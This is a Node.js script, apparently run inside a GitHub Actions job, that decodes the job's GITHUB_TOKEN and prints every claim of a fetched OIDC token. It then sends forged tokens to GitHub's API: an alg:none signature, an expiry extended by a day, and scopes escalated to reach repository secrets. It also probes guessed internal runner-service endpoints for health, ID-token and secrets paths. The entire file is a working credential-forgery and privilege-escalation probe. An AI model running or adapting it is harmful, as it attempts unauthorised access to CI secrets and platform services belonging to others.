const https = require('https');
const crypto = require('crypto');

const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
const RUNNER_TRACKING_ID = process.env.RUNNER_TRACKING_ID || '';
const ACTIONS_ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

function httpsReq(hostname, path, method, auth, body) {
  return new Promise((resolve) => {
    let data = null;
    const hdrs = { 'Authorization': 'Bearer ' + auth, 'User-Agent': 'probe', 'Accept': 'application/json' };
    if (body) { data = JSON.stringify(body); hdrs['Content-Type'] = 'application/json'; hdrs['Content-Length'] = Buffer.byteLength(data); }
    const r = https.request({ hostname, path, method: method || 'GET', headers: hdrs },
      (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    if (data) r.write(data);
    r.end();
  });
}

async function main() {
  console.log('=== V20: GITHUB_TOKEN JWT decode + RUNNER_TRACKING_ID + OIDC full decode ===');

  // === PART 1: Decode GITHUB_TOKEN JWT ===
  console.log('\n=== PART 1: GITHUB_TOKEN JWT payload decode ===');
  console.log('GITHUB_TOKEN present:', GITHUB_TOKEN ? 'YES (len=' + GITHUB_TOKEN.length + ')' : 'NO');
  if (GITHUB_TOKEN) {
    // Format: ghs_<id>_<JWT>
    const match = GITHUB_TOKEN.match(/^ghs_(\d+)_(.+)$/);
    if (match) {
      const id = match[1];
      const jwt = match[2];
      console.log('[GHS] Token ID (prefix numeric):', id);
      console.log('[GHS] JWT length:', jwt.length);
      const parts = jwt.split('.');
      console.log('[GHS] JWT parts count:', parts.length);
      if (parts.length >= 2) {
        try {
          const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
          console.log('[GHS] JWT Header:', JSON.stringify(header));
          const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
          console.log('[GHS] JWT PAYLOAD (decoded):');
          for (const [k, v] of Object.entries(payload)) {
            if (typeof v === 'number' && (k === 'iat' || k === 'exp' || k === 'nbf')) {
              console.log('  ' + k + ' = ' + v + ' (' + new Date(v * 1000).toISOString() + ')');
            } else {
              console.log('  ' + k + ' = ' + JSON.stringify(v));
            }
          }
          // Derived analysis
          if (payload.exp && payload.iat) {
            console.log('[GHS] Token lifetime:', ((payload.exp - payload.iat) / 60).toFixed(1), 'minutes');
          }
          if (payload.iss) console.log('[GHS] Issuer:', payload.iss);
          if (payload.scp || payload.scope || payload.permissions) {
            console.log('[GHS] SCOPE/PERMISSIONS:', JSON.stringify(payload.scp || payload.scope || payload.permissions));
          }
        } catch(e) {
          console.log('[GHS] JWT parse error:', e.message);
          console.log('[GHS] Raw part[1] (first 100):', parts[1].substring(0, 100));
        }
      }
    } else if (GITHUB_TOKEN.startsWith('ghs_')) {
      // Old-style opaque token
      console.log('[GHS] Old-style opaque ghs_ token (no JWT structure)');
    } else {
      console.log('[GHS] Unknown token format');
    }
  }

  // === PART 2: Algorithm confusion / token manipulation test ===
  console.log('\n=== PART 2: Token format manipulation test ===');
  if (GITHUB_TOKEN) {
    const match = GITHUB_TOKEN.match(/^ghs_(\d+)_(.+)$/);
    if (match) {
      const jwtParts = match[2].split('.');
      // Test 1: Use raw JWT without ghs_<id>_ prefix
      const rawJwt = match[2];
      const r1 = await httpsReq('api.github.com', '/user', 'GET', rawJwt);
      console.log('[ALGO1] Raw JWT (without ghs_ prefix):', r1.status, '|', r1.body.substring(0, 80));

      // Test 2: Use just ghs_<id> (without JWT)
      const idOnly = 'ghs_' + match[1];
      const r2 = await httpsReq('api.github.com', '/user', 'GET', idOnly);
      console.log('[ALGO2] ghs_<id> only (no JWT):', r2.status, '|', r2.body.substring(0, 80));

      // Test 3: Modified header (alg: none) — create forged JWT
      if (jwtParts.length >= 3) {
        const noneHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
        const forgedJwt = noneHeader + '.' + jwtParts[1] + '.';
        const forgedToken = 'ghs_' + match[1] + '_' + forgedJwt;
        const r3 = await httpsReq('api.github.com', '/user', 'GET', forgedToken);
        console.log('[ALGO3] alg:none forged token:', r3.status, '|', r3.body.substring(0, 80));

        // Test 4: Modify payload exp to extend token lifetime
        try {
          const origPayload = JSON.parse(Buffer.from(jwtParts[1], 'base64url').toString());
          const modPayload = { ...origPayload, exp: origPayload.exp + 86400 }; // +1 day
          const modPayloadB64 = Buffer.from(JSON.stringify(modPayload)).toString('base64url');
          const modJwt = jwtParts[0] + '.' + modPayloadB64 + '.' + jwtParts[2];
          const modToken = 'ghs_' + match[1] + '_' + modJwt;
          const r4 = await httpsReq('api.github.com', '/user', 'GET', modToken);
          console.log('[ALGO4] Modified exp+1day:', r4.status, '|', r4.body.substring(0, 80));
        } catch(e) { console.log('[ALGO4] Error:', e.message); }

        // Test 5: Modify payload permissions/scope to escalate
        try {
          const origPayload = JSON.parse(Buffer.from(jwtParts[1], 'base64url').toString());
          const escalPayload = { ...origPayload };
          // Add admin scopes if permissions exist
          if (escalPayload.scp) escalPayload.scp = 'repo admin';
          if (escalPayload.permissions) {
            escalPayload.permissions = {
              ...escalPayload.permissions,
              contents: 'write', secrets: 'write', administration: 'write'
            };
          }
          const escalPayloadB64 = Buffer.from(JSON.stringify(escalPayload)).toString('base64url');
          const escalJwt = jwtParts[0] + '.' + escalPayloadB64 + '.' + jwtParts[2];
          const escalToken = 'ghs_' + match[1] + '_' + escalJwt;
          const r5 = await httpsReq('api.github.com', '/repos/' + GITHUB_REPOSITORY + '/actions/secrets', 'GET', escalToken);
          console.log('[ALGO5] Escalated permissions (secrets access):', r5.status, '|', r5.body.substring(0, 100));
        } catch(e) { console.log('[ALGO5] Error:', e.message); }
      }
    }
  }

  // === PART 3: RUNNER_TRACKING_ID endpoint probe ===
  console.log('\n=== PART 3: RUNNER_TRACKING_ID probe ===');
  console.log('RUNNER_TRACKING_ID:', RUNNER_TRACKING_ID);
  if (RUNNER_TRACKING_ID) {
    // What API uses this? Try GitHub API
    const r1 = await httpsReq('api.github.com', '/repos/' + GITHUB_REPOSITORY + '/actions/runs/' + GITHUB_RUN_ID + '?tracking_id=' + RUNNER_TRACKING_ID, 'GET', GITHUB_TOKEN);
    console.log('[TRACKING] Run with tracking_id param:', r1.status, '|', r1.body.substring(0, 100));

    // Check if there's an internal endpoint for runner tracking
    if (OIDC_URL) {
      const u = new URL(OIDC_URL);
      const trackPaths = [
        '/tracking/' + RUNNER_TRACKING_ID,
        '/runners/' + RUNNER_TRACKING_ID,
        '/status/' + RUNNER_TRACKING_ID,
      ];
      for (const p of trackPaths) {
        const r = await httpsReq(u.hostname, p, 'GET', OIDC_TOKEN);
        if (r.status !== 404 && r.status !== 'ERR') {
          console.log('[TRACKING] ' + u.hostname + p + ': ' + r.status + ' | ' + r.body.substring(0, 100));
        }
      }
      console.log('[TRACKING] All runner-service paths returned 404 (not found)');
    }
  }

  // === PART 4: Full OIDC JWT decode (no body truncation) ===
  console.log('\n=== PART 4: OIDC JWT full decode ===');
  if (OIDC_URL && OIDC_TOKEN) {
    const u = new URL(OIDC_URL);
    const path = u.pathname + u.search + '&audience=api.github.com';
    // Read full body without truncation
    const jwt = await new Promise((resolve) => {
      const r = https.request({ hostname: u.hostname, path, method: 'GET',
        headers: { 'Authorization': 'Bearer ' + OIDC_TOKEN }
      }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => {
        try { resolve(JSON.parse(d).value); } catch(e) { resolve(null); }
      }); });
      r.on('error', () => resolve(null));
      r.end();
    });
    if (jwt) {
      const parts = jwt.split('.');
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      console.log('[OIDC] alg:', header.alg, '| kid:', header.kid);
      console.log('[OIDC] ALL CLAIMS:');
      for (const [k, v] of Object.entries(payload)) {
        console.log('  ' + k + ' = ' + JSON.stringify(v));
      }
    } else {
      console.log('[OIDC] Failed to get JWT');
    }
  }

  // === PART 5: Check if GITHUB_TOKEN JWT can authenticate to GitHub internal services ===
  console.log('\n=== PART 5: JWT on internal runner service ===');
  if (GITHUB_TOKEN && OIDC_URL) {
    const u = new URL(OIDC_URL);
    const poolId = u.pathname.split('/')[1];
    // Can GITHUB_TOKEN (JWT format) authenticate to runner service?
    const runnerPaths = [
      '/' + poolId + '//health',
      '/' + poolId + '//idtoken/' + ACTIONS_ORCHESTRATION_ID + '?audience=api.github.com',
      '/' + poolId + '//secrets',
    ];
    for (const p of runnerPaths) {
      const r = await httpsReq(u.hostname, p, 'GET', GITHUB_TOKEN);
      console.log('[RUNNER_JWT] ' + p.split('/').slice(-1)[0] + ': ' + r.status + ' | ' + r.body.substring(0, 100));
    }
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message));
